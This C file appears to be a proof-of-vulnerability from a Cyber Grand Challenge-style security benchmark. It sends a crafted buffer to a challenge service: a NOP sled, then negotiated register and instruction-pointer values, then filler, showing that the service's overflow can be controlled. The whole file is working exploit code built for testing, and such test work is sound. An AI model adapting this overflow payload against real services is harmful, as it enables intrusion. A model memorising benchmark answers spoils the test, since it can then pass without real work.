#include <libpov.h>
#include "xlat.h"

int main()
{
    xlat_seed("393748225");
    type1_vals t1;
    type1_negotiate(0xfefefefe, 0xfefefefe, 5, &t1);
    transmit_all(STDOUT, "1" NL, sizeof("1" NL) - 1);
    char header[] = {0xFF, 0xFA, 0xEC, 0x00, 0x00};
    char exploit[6508];
    memset(exploit, '\x90', 6416);
    char *pregs = &exploit[6416];
    memcpy(pregs, &t1.regval, sizeof(t1.regval));
    pregs += 4;
    memcpy(pregs, &t1.ipval, sizeof(t1.ipval));
    pregs += 4;
    memset(pregs, '\x88', 84);
    transmit_all(STDOUT, header, sizeof(header));
    transmit_all(STDOUT, exploit, sizeof(exploit));
    transmit_all(STDOUT, "15" NL, sizeof("15" NL) - 1);
    transmit_all(STDOUT, "15" NL, sizeof("15" NL) - 1);
    transmit_all(STDOUT, "15" NL, sizeof("15" NL) - 1);
    transmit_all(STDOUT, "15" NL, sizeof("15" NL) - 1);
    transmit_all(STDOUT, "15" NL, sizeof("15" NL) - 1);
    transmit_all(STDOUT, "15" NL, sizeof("15" NL) - 1);
    unsigned char *rbuf = NULL;
    unsigned int rsize = 0;
    delimited_read(STDIN, &rbuf, &rsize, (unsigned char *)"--Exited", 8);
    return 0;
}
